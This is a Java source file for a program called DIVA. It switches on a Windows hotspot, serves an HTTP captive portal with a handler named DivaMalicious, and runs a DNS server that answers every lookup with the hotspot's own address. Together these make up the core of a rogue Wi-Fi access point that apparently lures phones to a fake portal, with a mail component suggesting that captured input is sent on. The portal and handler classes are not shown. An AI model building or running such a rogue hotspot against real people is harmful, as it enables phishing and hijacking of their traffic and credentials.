package com.diva.diva;

import com.sun.net.httpserver.HttpServer;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.Executors;
import org.xbill.DNS.*;
import org.xbill.DNS.Record;

public class DIVA {

    public static void main(String[] args) throws Exception {

        int puerto = Integer.parseInt(
                System.getProperty("diva.port", "80")
        );

        if (puerto < 1 || puerto > 65535) {
            throw new IllegalArgumentException(
                    "Puerto inválido: " + puerto
            );
        }

        HttpServer servidor;

        try {
            servidor = HttpServer.create(
                    new InetSocketAddress("0.0.0.0", puerto), 0
            );

        } catch (java.net.BindException e) {
            System.err.println(
                    "Puerto " + puerto
                    + " ocupado. Detén la otra ejecución de DIVA."
            );
            return;
        }

        PortalCautivo portal = new PortalCautivo(new Correo());

        var trabajadores = Executors.newFixedThreadPool(8);

        servidor.createContext("/", portal);

        servidor.createContext(
                "/confirmacion",
                new DivaMalicious(portal)
        );

        servidor.setExecutor(trabajadores);

        // Iniciar el servidor DNS interno para la captura del Portal Cautivo
        String ipHotspot = System.getProperty("diva.ip", "192.168.137.1");
        ServidorDNS servidorDns = new ServidorDNS(ipHotspot, 53);
        Thread hiloDns = new Thread(servidorDns);
        hiloDns.setDaemon(true);
        hiloDns.start();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            servidor.stop(0);
            trabajadores.shutdownNow();
            portal.cerrar();
            servidorDns.detener();
        }));

        servidor.start();

        String sufijo = puerto == 80 ? "" : ":" + puerto;

        System.out.println(
                "[DIVA] Portal: http://localhost" + sufijo
        );

        if (Boolean.parseBoolean(
                System.getProperty("diva.hotspot", "true"))) {

            try {
                HostPot.activar();

                System.out.println(
                        "[WIFI] Windows confirmó el hotspot encendido."
                );

            } catch (Exception | LinkageError e) {
                System.err.println(
                        "[WIFI] No se pudo activar: " + e.getMessage()
                );

                System.err.println(
                        "El portal sigue disponible para probarlo en este PC."
                );
            }
        }

        System.out.println(
                "[DIVA] En el celular abre "
                + "http://" + ipHotspot + sufijo
        );

        System.out.println(
                "[DIVA] Servidor DNS captivo corriendo en puerto UDP 53."
        );

        System.out.println(
                "[DIVA] Para terminar, detén la ejecución en NetBeans."
        );

        new CountDownLatch(1).await();
    }

    // Servidor DNS integrado para responder todas las consultas hacia la IP local
    static class ServidorDNS implements Runnable {

        private final String ipLocal;
        private final int puerto;
        private volatile boolean activo = true;
        private DatagramSocket socket;

        public ServidorDNS(String ipLocal, int puerto) {
            this.ipLocal = ipLocal;
            this.puerto = puerto;
        }

        @Override
        public void run() {
            try {
                socket = new DatagramSocket(puerto);
                byte[] buffer = new byte[512];

                while (activo && !socket.isClosed()) {
                    DatagramPacket paquete = new DatagramPacket(buffer, buffer.length);
                    socket.receive(paquete);

                    byte[] peticionDatos = paquete.getData();
                    Message peticion = new Message(peticionDatos);
                    Message respuesta = new Message(peticion.getHeader().getID());

                    respuesta.getHeader().setFlag(Flags.QR);
                    respuesta.getHeader().setFlag(Flags.AA);

                    Record pregunta = peticion.getQuestion();
                    if (pregunta != null) {
                        respuesta.addRecord(pregunta, Section.QUESTION);

                        if (pregunta.getType() == Type.A) {
                            Record aRecord = Record.newRecord(
                                    pregunta.getName(),
                                    Type.A,
                                    DClass.IN,
                                    60,
                                    InetAddress.getByName(ipLocal).getAddress()
                            );
                            respuesta.addRecord(aRecord, Section.ANSWER);
                        }
                    }

                    byte[] respuestaDatos = respuesta.toWire();
                    DatagramPacket paqueteRespuesta = new DatagramPacket(
                            respuestaDatos,
                            respuestaDatos.length,
                            paquete.getAddress(),
                            paquete.getPort()
                    );
                    socket.send(paqueteRespuesta);
                }
            } catch (Exception e) {
                if (activo) {
                    System.err.println("[DNS] Nota: Si falta permiso de Administrador, el puerto 53 no responderá consultas DNS.");
                }
            }
        }

        public void detener() {
            this.activo = false;
            if (socket != null && !socket.isClosed()) {
                socket.close();
            }
        }
    }
}